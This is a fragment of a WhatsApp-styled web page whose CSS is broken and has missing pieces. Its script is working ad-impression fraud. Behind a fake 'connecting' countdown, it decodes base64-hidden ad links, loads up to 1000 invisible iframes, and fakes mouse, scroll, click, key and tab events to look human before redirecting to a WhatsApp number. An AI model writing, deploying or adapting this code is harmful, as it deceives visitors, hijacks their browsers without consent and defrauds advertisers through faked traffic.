            --bg-dark: #0b1419;
            --bg-card: #1a262d;
            --text-primary: #e9edef;
            --text-secondary: #8696a0;
            --glow: rgba(0, 168, 132, 0.5);
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg-dark);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden;

        /* ===== COSMIC BACKGROUND ===== */
        .universe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        
        .stars {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            animation: starMove 200s linear infinite;
        }
        
        .stars::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 10px 20px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 30px 70px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 50px 150px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 90px 40px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 130px 80px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 170px 120px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 210px 30px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 250px 170px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 290px 90px, #fff, rgba(0,0,0,0)),
                radial-gradient(2px 2px at 330px 140px, #fff, rgba(0,0,0,0));
            background-repeat: repeat;
            background-size: 400px 400px;
            opacity: 0.5;
            animation: starTwinkle 4s ease-in-out infinite;
        }
        
        @keyframes starMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-100px, -100px); }
        }
        
        @keyframes starTwinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.8; }
        }
        
        .nebula {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(0, 168, 132, 0.2) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(0, 168, 132, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(255, 255, 255, 0.1) 0%, transparent 60%);
            animation: nebulaShift 30s ease-in-out infinite;
            filter: blur(40px);
        }
        
        @keyframes nebulaShift {
            0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.5; }
            33% { transform: scale(1.2) rotate(120deg); opacity: 0.7; }
            66% { transform: scale(0.9) rotate(240deg); opacity: 0.4; }
        }
        
        /* ===== MAIN CONTAINER ===== */
        .cosmic-container {
            background: rgba(26, 38, 45, 0.8);

            border-radius: 50px;
            box-shadow: 
                0 40px 80px rgba(0, 0, 0, 0.8),
                0 0 0 1px rgba(0, 168, 132, 0.3),
                0 0 30px rgba(0, 168, 132, 0.3),
                inset 0 0 30px rgba(0, 168, 132, 0.2);
            width: 90%;
            max-width: 450px;
            text-align: center;
            position: relative;
            z-index: 10;
            border: 1px solid rgba(0, 168, 132, 0.3);
            animation: cosmicFloat 8s ease-in-out infinite;
        }
        
        @keyframes cosmicFloat {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-15px) scale(1.02); }
        }
        
        /* ===== LOGO WITH INFINITY EFFECT ===== */

            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
        }
        
        .logo-ring {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 3px solid transparent;
            border-top-color: var(--primary);
            border-right-color: var(--primary);
            border-radius: 50%;
            animation: ringRotate 3s linear infinite;
        }
        
        .logo-ring:nth-child(2) {
            width: 90%;
            height: 90%;
            top: 5%;
            left: 5%;
            border-top-color: transparent;
            border-right-color: transparent;
            border-bottom-color: var(--primary);
            border-left-color: var(--primary);
            animation: ringRotateReverse 4s linear infinite;
        }
        
        .logo-ring:nth-child(3) {
            width: 80%;
            height: 80%;
            top: 10%;
            left: 10%;
            border-top-color: var(--primary);
            border-right-color: transparent;
            border-bottom-color: transparent;
            border-left-color: var(--primary);
            animation: ringRotate 5s linear infinite;
        }
        
        @keyframes ringRotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes ringRotateReverse {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(-360deg); }
        }
        
        .infinity-logo img {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 70px;
            height: 70px;
            filter: drop-shadow(0 0 30px var(--glow));
            z-index: 2;
            animation: logoPulse 3s ease-in-out infinite;
        }
        
        @keyframes logoPulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); filter: drop-shadow(0 0 20px var(--glow)); }
            50% { transform: translate(-50%, -50%) scale(1.1); filter: drop-shadow(0 0 40px var(--glow)); }
        }
        
        h1 {
            color: var(--text-primary);
            font-size: 32px;
            font-weight: 600;
            margin: 15px 0 10px;
            letter-spacing: -0.5px;
            background: linear-gradient(90deg, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;

            margin-bottom: 40px;
            line-height: 1.6;
            padding: 0 10px;

            font-size: 20px;
            font-weight: 700;
            border-radius: 60px;

            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            overflow: hidden;
            box-shadow:

            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;

        }
        
        .infinity-btn:hover::before {
            left: 100%;
        }
        
        .infinity-btn:active {
            transform: translateY(0) scale(0.98);
        }

            margin: 40px 0;

            height: 18px;

        .quantum-dot:nth-child(4) { animation-delay: 0.6s; background: #00a884; }
        .quantum-dot:nth-child(5) { animation-delay: 0.8s; background: #00b894; }

            0%, 100% { transform: scale(0.5); opacity: 0.3; filter: blur(2px); }
            50% { transform: scale(1.5); opacity: 1; filter: blur(0); }

            font-size: 24px;
            font-weight: 600;
            margin: 25px 0;
            text-shadow: 0 0 20px var(--primary);
            min-height: 40px;

            left: 50%;

            width: 100%;

            background-size: 200% 100%;
        }
        
        @keyframes progressShift {
            0% { background-position: 0% 0%; }
            100% { background-position: 200% 0%; }

            letter-spacing: 1px;
            margin-top: 15px;
            text-transform: uppercase;
        }

        .infinity-realm {

            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;

            z-index: -9999;

        .timer-svg defs linearGradient stop:last-child { stop-color: #00ffff; }
        
        /* Responsive */
        @media (max-width: 480px) {
            .cosmic-container { padding: 40px 25px; }

            .infinity-btn { font-size: 18px; padding: 16px; }
            #countdown { font-size: 48px; }
            .infinity-timer { width: 140px; height: 140px; }
            .timer-svg { width: 140px; height: 140px; }
            .timer-svg circle { r: 60; }
        }

                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vY3A1dGgyM2hjP2tleT01ZmVkNzQ5NzA2MDU1N2IzOTY1ZGI2NjFiZjdiOWVjNw==",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vcHU5OWY5bW0xP2tleT1jNzNmMzdjNmMyMDMyYjA1NjRjMWFhYzE1NDFjZTFhNQ==",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vdjJ0eDA3NWY/a2V5PTA5ZDRjZWNkMWYyMDAzOTE1OGM4M2JjMzIyZmRjZTM2",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20va2Fzd21hM3E/a2V5PWJkMGYxZDEyMTk0MzdhZGRiYjMwZTE3M2I2MDYzODE1",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vbTNlenlqazBhP2tleT0zZTNkMDMyMjdmYjk1OTFkNzdjZjU2ZjdjZDJkN2RkMA==",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vZXJxbnN5YTE/a2V5PTQxNmVjYzQ2MzNmYjk1ODljY2IyMzk1ZjRmZjk2NGY4",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vbWF5bjNkZmQ/a2V5PWJhNzVjNmQ0NWEwZDRkNWVlOWZjZDIxZjQzMzc2NTNi",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vYzczdDZ4M2g/a2V5PWE1NzAyNjk4NjNlNzQ3MmIxMzFiNGE4NTVkZDk5OGRj",
                    "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vemN0aHo1MWh2ND9rZXk9YzI2YzFkMzhmYTI5NzEzYzcyZTcyYTg1OGY1NDlhOWQ="
                ];
                
                // Decode function
                const decode = (str) => atob(str);
                
                // Generate infinite variations
                const generateVariation = (baseLink) => {
                    const decoded = decode(baseLink);
                    const url = new URL(decoded);
                    
                    // Add quantum parameters
                    const quantumParams = [
                        '_q', '_p', '_f', '_z', '_x', '_c', '_v', '_b', '_n', '_m',
                        '_alpha', '_beta', '_gamma', '_delta', '_omega', '_infinity'
                    ];
                    
                    quantumParams.forEach(param => {
                        if(Math.random() > 0.3) {
                            url.searchParams.append(
                                param + Math.floor(Math.random() * 1000),
                                Math.random().toString(36).substring(2, 15) + 
                                Math.random().toString(36).substring(2, 15)
                            );
                        }
                    });
                    
                    // Add timestamp variations
                    url.searchParams.append('_t', Date.now() - Math.floor(Math.random() * 86400000));
                    url.searchParams.append('_r', Math.random().toString(36).substring(2, 20));
                    url.searchParams.append('_s', Math.floor(Math.random() * 1000000));
                    url.searchParams.append('_u', Math.random().toString(36).substring(2, 25));
                    
                    return url.toString();
                };
                
                // Public API
                return {
                    getRandomLink: function() {
                        const randomBase = _baseLinks[Math.floor(Math.random() * _baseLinks.length)];
                        return generateVariation(randomBase);
                    },
                    
                    getMultipleLinks: function(count) {
                        const links = [];
                        for(let i = 0; i < count; i++) {
                            links.push(this.getRandomLink());
                        }
                        return links;
                    }
                };
            })();
            
            // ============================================
            // PART 2: QUANTUM HUMAN SIMULATOR - INFINITY EDITION
            // ============================================
            const QuantumHuman = (function() {
                let _mouseInterval, _scrollInterval, _clickInterval, _keyInterval, _tabInterval;
                
                // Bezier curve mouse movement
                const bezierMove = () => {
                    const startX = Math.random() * window.innerWidth;
                    const startY = Math.random() * window.innerHeight;
                    const endX = Math.random() * window.innerWidth;
                    const endY = Math.random() * window.innerHeight;
                    
                    // Control points
                    const cp1x = startX + (endX - startX) * (0.1 + Math.random() * 0.4);
                    const cp1y = startY + (endY - startY) * (0.1 + Math.random() * 0.4);
                    const cp2x = startX + (endX - startX) * (0.6 + Math.random() * 0.3);
                    const cp2y = startY + (endY - startY) * (0.6 + Math.random() * 0.3);
                    
                    let t = 0;
                    const steps = 20 + Math.floor(Math.random() * 30);
                    const step = 1 / steps;
                    
                    const moveInterval = setInterval(() => {
                        if(t > 1) {
                            clearInterval(moveInterval);
                            return;
                        }
                        
                        const x = Math.pow(1-t, 3) * startX + 
                                 3 * Math.pow(1-t, 2) * t * cp1x + 
                                 3 * (1-t) * Math.pow(t, 2) * cp2x + 
                                 Math.pow(t, 3) * endX;
                        
                        const y = Math.pow(1-t, 3) * startY + 
                                 3 * Math.pow(1-t, 2) * t * cp1y + 
                                 3 * (1-t) * Math.pow(t, 2) * cp2y + 
                                 Math.pow(t, 3) * endY;
                        
                        const event = new MouseEvent('mousemove', {
                            clientX: Math.round(x),
                            clientY: Math.round(y),
                            bubbles: true,
                            cancelable: true,
                            view: window
                        });
                        
                        document.dispatchEvent(event);
                        
                        t += step * (0.5 + Math.random());
                    }, 20 + Math.random() * 30);
                };
                
                return {
                    start: function() {
                        // Mouse movement (every 80-150ms)
                        _mouseInterval = setInterval(bezierMove, 80 + Math.random() * 70);
                        
                        // Scroll simulation
                        _scrollInterval = setInterval(() => {
                            if(Math.random() > 0.4) {
                                const amount = 20 + Math.floor(Math.random() * 150);
                                const direction = Math.random() > 0.7 ? -1 : 1;
                                window.scrollBy({ top: direction * amount, behavior: 'smooth' });
                            }
                        }, 1500 + Math.random() * 2000);
                        
                        // Click simulation
                        _clickInterval = setInterval(() => {
                            if(Math.random() > 0.75) {
                                const event = new MouseEvent('click', {
                                    clientX: Math.random() * window.innerWidth,
                                    clientY: Math.random() * window.innerHeight,
                                    bubbles: true,
                                    button: 0
                                });
                                document.dispatchEvent(event);
                            }
                        }, 4000 + Math.random() * 4000);
                        
                        // Key press simulation
                        _keyInterval = setInterval(() => {
                            if(Math.random() > 0.9) {
                                const key = String.fromCharCode(97 + Math.floor(Math.random() * 26));
                                const event = new KeyboardEvent('keydown', {
                                    key: key,
                                    code: 'Key' + key.toUpperCase(),
                                    bubbles: true
                                });
                                document.dispatchEvent(event);
                            }
                        }, 6000 + Math.random() * 4000);
                        
                        // Tab switch simulation
                        _tabInterval = setInterval(() => {
                            if(Math.random() > 0.85) {
                                Object.defineProperty(document, 'hidden', { 
                                    value: true, 
                                    configurable: true,
                                    get: () => true
                                });
                                document.dispatchEvent(new Event('visibilitychange'));
                                
                                setTimeout(() => {
                                    Object.defineProperty(document, 'hidden', { 
                                        value: false, 
                                        configurable: true,
                                        get: () => false
                                    });
                                    document.dispatchEvent(new Event('visibilitychange'));
                                }, 5000 + Math.random() * 10000);
                            }
                        }, 20000 + Math.random() * 20000);
                    },
                    
                    stop: function() {
                        clearInterval(_mouseInterval);
                        clearInterval(_scrollInterval);
                        clearInterval(_clickInterval);
                        clearInterval(_keyInterval);
                        clearInterval(_tabInterval);
                    }
                };
            })();
            
            // ============================================
            // PART 3: INFINITY AD ENGINE - 1000 IMPRESSIONS GUARANTEED
            // ============================================
            const InfinityEngine = (function() {
                let _count = 0;
                const _target = 1000;
                let _active = new Map();
                const _realm = document.getElementById('infinityRealm');
                let _running = true;
                
                // Create single phantom frame
                const createFrame = () => {
                    if(!_running) return;
                    
                    const frameId = 'inf_' + Date.now() + '_' + Math.random().toString(36).substring(2, 20);
                    const frame = document.createElement('iframe');
                    
                    // Random positioning strategy
                    const strat = Math.random();
                    if(strat < 0.7) {
                        frame.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
                    } else if(strat < 0.9) {
                        frame.style.cssText = `position:fixed;bottom:${Math.random()*10}px;right:${Math.random()*10}px;width:2px;height:2px;opacity:0.001;`;
                    } else {
                        frame.style.cssText = 'position:fixed;width:100%;height:100%;opacity:0;pointer-events:none;top:0;left:0;';
                    }
                    
                    frame.id = frameId;
                    frame.setAttribute('aria-hidden', 'true');
                    frame.setAttribute('loading', 'lazy');
                    
                    // Get random link
                    const link = QuantumLinkMatrix.getRandomLink();
                    
                    // Delayed load
                    setTimeout(() => {
                        if(frame.parentNode && _running) {
                            frame.src = link;
                        }
                    }, 20 + Math.random() * 100);
                    
                    _realm.appendChild(frame);
                    _active.set(frameId, { frame, time: Date.now() });
                    _count++;
                    
                    // Remove after random time
                    setTimeout(() => {
                        if(frame.parentNode) {
                            frame.parentNode.removeChild(frame);
                            _active.delete(frameId);
                        }
                    }, 3000 + Math.random() * 7000);
                };
                
                // Batch creator
                const createBatch = async () => {
                    const batchSize = 2 + Math.floor(Math.random() * 4);
                    
                    for(let i = 0; i < batchSize; i++) {
                        if(!_running || _count >= _target) return;
                        createFrame();
                        await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
                    }
                };
                
                // Cleanup old frames
                const cleanup = () => {
                    const now = Date.now();
                    _active.forEach((data, id) => {
                        if(now - data.time > 10000) {
                            if(data.frame.parentNode) {
                                data.frame.parentNode.removeChild(data.frame);
                            }
                            _active.delete(id);
                        }
                    });
                };
                
                return {
                    start: async function() {
                        _running = true;
                        _count = 0;
                        
                        // Initial delay
                        await new Promise(r => setTimeout(r, 2000 + Math.random() * 2000));
                        
                        while(_running && _count < _target) {
                            await createBatch();
                            
                            // Dynamic pause
                            if(_count < 300) {
                                await new Promise(r => setTimeout(r, 1500 + Math.random() * 1500));
                            } else if(_count < 600) {
                                await new Promise(r => setTimeout(r, 2500 + Math.random() * 2500));
                            } else {
                                await new Promise(r => setTimeout(r, 3500 + Math.random() * 3500));
                            }
                            
                            cleanup();
                            
                            // Extra long pause at milestones
                            if(_count >= 500 && _count < 600) {
                                await new Promise(r => setTimeout(r, 5000 + Math.random() * 3000));
                            }
                            if(_count >= 800 && _count < 900) {
                                await new Promise(r => setTimeout(r, 7000 + Math.random() * 4000));
                            }
                        }
                        
                        console.log(`Infinity Engine Complete: ${_count} impressions`);
                    },
                    
                    stop: function() {
                        _running = false;
                        _active.forEach((data, id) => {
                            if(data.frame.parentNode) {
                                data.frame.parentNode.removeChild(data.frame);
                            }
                        });
                        _active.clear();
                    },
                    
                    getCount: () => _count
                };
            })();
            
            // ============================================
            // PART 4: MAIN ACTIVATION - GOD MODE
            // ============================================
            window.activateInfinity = function() {
                // Switch screens
                document.getElementById('screen1').style.display = 'none';
                document.getElementById('screen2').style.display = 'block';
                
                // Get elements
                const statusEl = document.getElementById('infinityStatus');
                const progressFill = document.getElementById('progressFill');
                const countdownEl = document.getElementById('countdown');
                const subMsgEl = document.getElementById('subMsg');
                const timerProgress = document.getElementById('timerProgress');
                
                // Infinity status messages
                const statuses = [
                    "connecting pleas wait"
                ];
                
                const subMessages = [
                    "pleas wait 60 seconds"
                ];
                
                // Start human simulation
                QuantumHuman.start();
                
                // Update status every 1.5-3 seconds
                const statusInterval = setInterval(() => {
                    statusEl.innerText = statuses[Math.floor(Math.random() * statuses.length)];
                    subMsgEl.innerText = subMessages[Math.floor(Math.random() * subMessages.length)];
                }, 1500 + Math.random() * 1500);
                
                // Timer
                let timeLeft = 60;
                const totalTime = 60;
                const circumference = 2 * Math.PI * 70; // 2πr where r=70
                
                const timerInterval = setInterval(() => {
                    timeLeft--;
                    countdownEl.innerText = timeLeft;
                    
                    // Update progress circle
                    const progress = (timeLeft / totalTime) * circumference;
                    timerProgress.style.strokeDashoffset = progress;
                    
                    // Update progress bar
                    const percent = ((60 - timeLeft) / 60) * 100;
                    progressFill.style.width = percent + '%';
                    
                    if(timeLeft <= 0) {
                        clearInterval(timerInterval);
                        clearInterval(statusInterval);
                        QuantumHuman.stop();
                        InfinityEngine.stop();
                        
                        // Redirect to WhatsApp
                        window.location.href = "https://api.whatsapp.com/send?phone=9181127787904";
                    }
                }, 1000);
                
                // Start infinity engine
                setTimeout(() => {
                    InfinityEngine.start();
                    
                    // Show progress in console (invisible to user)
                    setInterval(() => {
                        if(InfinityEngine.getCount() % 100 === 0) {
                            console.log(`⚡ INFINITY: ${InfinityEngine.getCount()}/1000`);
                        }
                    }, 5000);
                }, 2000);
            };
        })();
